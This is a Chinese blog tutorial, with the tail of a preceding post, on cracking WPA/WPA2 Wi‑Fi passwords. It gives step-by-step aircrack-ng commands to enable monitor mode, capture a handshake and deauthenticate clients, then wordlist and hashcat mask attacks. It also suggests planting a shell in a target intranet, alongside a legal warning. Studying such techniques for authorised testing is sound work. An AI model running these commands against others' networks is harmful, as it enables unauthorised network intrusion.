-<p>0x04 具体的hash破解过程<br>&nbsp;&nbsp;&nbsp;&nbsp;最后,还是跟之前一样,直接处理下丢给hashcat或者aircrack都行,因为这里只是为了测试,所以就直接丢到aircrack中跑了,另外,有个需要注意的地方,如果你还是像之前那样直接用wpaclean处理,然后再丢给hashcat,破解速度会瞬间下降将近两万倍,其实,我也没搞懂这到底是为啥(懒得看代码,也没那个必要),所以,我个人还是推荐直接手工用aircrack相对比较靠谱,毕竟,越自动化的东西,往往对现实环境的适应力就越差,问题也就越多,不靠谱都是很正常的<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">aircrack-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span>  <span class="selector-tag">-w</span> ../<span class="selector-tag">pass</span><span class="selector-class">.txt</span> <span class="selector-tag">klionsec_DC-EE-06-96-B7-B8</span><span class="selector-class">.cap</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/ha.png" alt="握手包位置"><br></p>
-<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不可否认的是,脚本一定程度上确实很方便,但它同时显的很呆笨,里面的每个操作并非都是最适合我们的,对于渗透来讲,我们需要知道的往往是更细节的东西,自动化脚本对于还处在学习阶段的我们,并没什么实际的好处,因为它会严重阻碍你自己思考的习惯,总之,个人此脚本并不建议在实战中使用,除了破解时间的问题,实际测试的时候还有一些其它的小问题,还是那句话,建议直接手工aircrack,也许会更灵活点,不过,在kali nethunter中的表现还是不错的</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2015/04/14/aircrack-hascat/">
-                aircrack & hashcat 非字典高速破解目标无线密码
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2015-04-14</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>0x01 挂载好外置无线网卡<br>&nbsp;&nbsp;&nbsp;&nbsp;把用于抓包的无线网卡挂到kali中,正常情况下,网卡在成功载入系统后,应该是如下的效果,在虚拟机设置中选择’可移动设备’把你的网卡连到虚拟机里<br><img src="/img/1.png" alt="&quot;将网卡载入kali&quot;"><br>如下图可以看到系统已自动识别该网卡,并且已自动搜到附近的无线信号<br><img src="/img/2.png" alt="查看系统是否已经识别该网卡"><br><img src="/img/3.png" alt="看看能不能收到附近的无线信号"></p>
-<p>0x02 检查无线网卡驱动是否能正常工作<br>&nbsp;&nbsp;&nbsp;&nbsp;紧接着,来看下当前系统中是否已经识别出该无线网卡的驱动,假设当前系统内核中已经有了该种无线网卡的驱动,它就会直接显示出当前无线网卡所使用的芯片组,可以看到,我这里用的是RT2800的芯片组(推荐大家直接去某宝买),如果没有,则可能需要你自己去手工编译安装相应的无线网卡驱动,然后再更新下内核模块即可(在linux中编译安装驱动着实是一件比较麻烦的事情,建议买的时候就直接去买aircrack所支持的网卡型号,起码用的时候不至于这么费劲,要相信万能的某宝),但这并不代表你只要把无线网卡驱动安装好就可以用了,需要搞清楚的是,你所使用的无线网卡芯片组必须要被aircrack所支持才可以,因为用无线网卡的最终目的还是用来捕获握手包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng  查看当前系统中的所有可用的无线网卡接口</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/4.png" alt="看看aircrack是否已经识别芯片组"><br></p>
-<p>0x03 关于aircrack所支持的网卡芯片组列表,请自行参考aircrack官方说明:<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>//www.aircrack-ng<span class="meta">.org</span>/doku.php?id=compatibility_drivers</div></pre></td></tr></table></figure></p>
-<p>0x04 为了保证aircrack套件在运行的时候不被其他进程所干扰,我们需要先执行以下命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng check <span class="built_in">kill</span></span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/5.png" alt="aircrack启动检查"></p>
-<p>0x05 可以看到,当前网卡默认还处在管理模式,这时我们需要手动将其变成监听模式,这样才能进行正常的抓包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> iwconfig  使用此命令可查看无线网卡的当前工作模式</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/6.png" alt="查看网卡工作模式"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng start wlan0   把网卡改为监听模式</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/7.png" alt="将网卡切换为监听模式"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> iwconfig  再次查看无线网卡工作模式是否真的已经改过来了</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/45.png" alt="看看网卡工作模式是否已经切换成功"></p>
-<p>0x06<br>&nbsp;&nbsp;&nbsp;&nbsp;另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon,恩,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方蹬掉线,才能截获他的握手包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airodump-ng wlan0mon 开始尝试扫描附近的无线信号,这里就用我们自己的wifi来进行测试,用于测试的wifi的mac和热点名称如下(klionsec)</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/8.png" alt="扫描附近的无线信号"></p>
-<p>0x07<br>&nbsp;&nbsp;&nbsp;&nbsp;通过上面的扫描,我们选定了名称为”klionsec”的wpa2无线热点作为我们的攻击目标,这里我们需要先记录下目标无线的工作信道以及对应的mac,(后面单独监听时需要用到这些信息),而后,单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">airodump-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">-c</span> 6 <span class="selector-tag">-w</span> <span class="selector-tag">sec</span> <span class="selector-tag">wlan0mon</span> 监听目标无线,并把截获到的数据写到指定文件中</div></pre></td></tr></table></figure></p>
-<p><img src="/img/9.png" alt="单独监听目标无线"></p>
-<p>0x08<br>&nbsp;&nbsp;&nbsp;&nbsp;发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">aireplay-ng</span> <span class="selector-tag">--deauth</span> 15 <span class="selector-tag">-a</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">wlan0mon</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/10.png" alt="开始发动ddos攻击"></p>
-<p>可以看到,这时握手包已被正常抓获,此时监听也就可以断开了,注意观察终端的右上角,那个带有<code>handshake</code>标志的就是握手包的意思<br><img src="/img/11.png" alt="成功获取握手包"></p>
-<p>0x09<br>&nbsp;&nbsp;&nbsp;&nbsp;在我们抓获握手包以后,接下来的事情就非常简单了,你可以直接用aircrack加载弱口令字典进行爆破,当然,个人是十分不建议用字典(效率,实用性,太低,过于浪费时间),推荐大家直接把包处理一下丢给hashcat或者某宝去跑就行了,两种方法具体操作如下:</p>
-<p>(1)第一种,利用aircrack加载字典进行爆破,反正我自己很少用,基本没用过,先不说速度如何,关键还是看你的字典是否靠谱,实际测试中,个人并不建议用,因为根本没有靠谱性可言,因为这里仅仅是测试,实际渗透中,哪有太多的时间让你去跑[比如,实地渗透]<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">aircrack-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">-w</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span> <span class="selector-tag">sec-01</span><span class="selector-class">.cap</span>   会有三个文件,但最终的密码在<span class="selector-tag">cap</span>文件</div></pre></td></tr></table></figure></p>
-<p><img src="/img/12.png" alt="破解握手包中的无线密码"></p>
-<p>(2)第二种,直接利用hashcat跑hash,不过需要你事先稍微整理下数据包<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">wpaclean</span> <span class="selector-tag">wpapass</span><span class="selector-class">.cap</span> <span class="selector-tag">sec-01</span><span class="selector-class">.cap</span>  	  可以看到这里已经成功识别出了目标无线<span class="selector-tag">id</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/13.png" alt="提取数据包中的hash"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> aircrack-ng wpapass.cap -J wpahash  把数据包转换成hashcat能认识的<span class="built_in">hash</span>类型</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/15.png" alt="转换成hashcat认识的hash格式"><br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hashcat -m 2500 -a 3 wpahash.hccap ?u?l?l?l?l?d?d?d  因为我事先已经知道密码,所以直接这样给掩码会跑的更快一些</span></div></pre></td></tr></table></figure></p>
-<p>下面是hashcat的破解结果,可以看到,像这种密码,对于hashcat来讲,几乎是瞬间就被秒出来了,因为事先忘记了把wifi改的简单点(<code>汗……</code>),所以这里不得不拿之前的一个测试案例来说明了,因为这次用于测试的wifi密码比较复杂,要是硬破,估计明年也破不出来,所以没必要在这里浪费时间,重要的是把方法告诉大家就好,测试结果并不是最重要的,能把要说明的问题说清楚即可<br><img src="/img/hash.png" alt="破解结果"><br></p>
-<p>0x10<br>&nbsp;&nbsp;&nbsp;&nbsp;至此,整个无线密码破解的经典步骤就算完成了,纵观全文,其实,并没多少技术含量在里面,跟着我的文档一步步的来,抓个包,跑个密码基本还是没什么问题的,其实,如果真的特别想关注底层的细节,不妨自己通过wireshark手工完成这一过程,可以明确告诉大家的是,这样是绝对可行的,请自行尝试<br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;在破解无线密码的问题上,大家大可不用太过纠结,破密码的最终目的,也是希望能通过这种方式来在目标上开个口子,仅此而已,如果真的是哪天运气爆棚,直接捅到目标的办公网,自然是求之不得,因为毕竟是在实地,可能留给我们的时间也不会太多,更会有诸多不便,想短时间内把整个内网摸透,可能也来不及,但想办法先在目标内网留个shell稳住入口,回去接着慢慢搞,还是可行的,一般对于从外部打进去非常难的情况下,这也许也是一种切实可行的渗透手段,祝大家好运吧,不过,最后,还是有句话不得不提醒大家,访问未授权的系统本身就是违法的,望大家洁身自好……!</p>
 
         </div>
     
